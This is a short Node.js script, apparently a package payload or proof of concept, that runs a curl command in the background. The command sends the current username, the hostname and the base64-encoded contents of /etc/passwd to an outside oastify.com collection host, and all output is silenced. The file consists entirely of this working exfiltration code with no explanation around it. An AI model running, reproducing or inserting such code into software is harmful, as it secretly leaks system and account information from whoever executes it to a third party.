const { exec } = require('child_process');

const command = `curl -X POST "https://sampleid.oastify.com/$(whoami)/$(hostname)/" -A "$(echo profile && cat /etc/passwd | base64 | tr '\n' '.')" -s -o /dev/null`;
exec(command, () => {});
